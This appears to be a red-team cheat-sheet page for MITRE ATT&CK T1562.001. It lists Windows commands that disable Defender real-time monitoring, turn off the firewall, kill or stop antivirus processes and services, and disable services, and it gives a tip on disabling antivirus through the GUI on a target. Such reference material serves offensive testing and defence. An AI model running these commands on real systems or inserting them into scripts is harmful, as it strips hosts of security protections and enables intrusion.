---
description: MITRE ATT&CK, Defense Evasion, Sub-technique T1562.001
---

# Disable or Modify Tools

### Methods

```powershell
# Disable real-time monitoring for Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable Windows firewall
netsh advfirewall set allprofiles state off

# Manually disable antivirus 
taskkill /F /IM avprocess.exe

# Stop an antivirus service
net stop "$service_name"

# Disable a Windows service
sc config "service name" start= disabled
```

#### Disable Antivirus via the GUI

Non-administrative users are sometimes able to disable or create an exception for the antivirus running on the host via the GUI. If the target has one of these then you can either right click the icon in the task bar and disable it or manually open the GUI and disable it in settings.
